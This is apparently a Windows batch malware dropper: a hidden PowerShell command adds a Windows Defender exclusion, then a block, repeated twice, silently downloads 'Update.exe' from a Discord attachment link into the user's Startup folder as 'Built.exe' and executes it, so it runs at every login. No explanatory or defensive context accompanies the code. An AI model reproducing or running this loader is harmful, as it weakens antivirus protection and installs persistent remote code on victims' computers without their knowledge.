powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220401254115709008/Update.exe?ex=660ece3c&is=65fc593c&hm=db6bf9f95339afc54a3a8911fa8ef21a03dda06027518328ed69f3a0f8b156af&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220401254115709008/Update.exe?ex=660ece3c&is=65fc593c&hm=db6bf9f95339afc54a3a8911fa8ef21a03dda06027518328ed69f3a0f8b156af&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"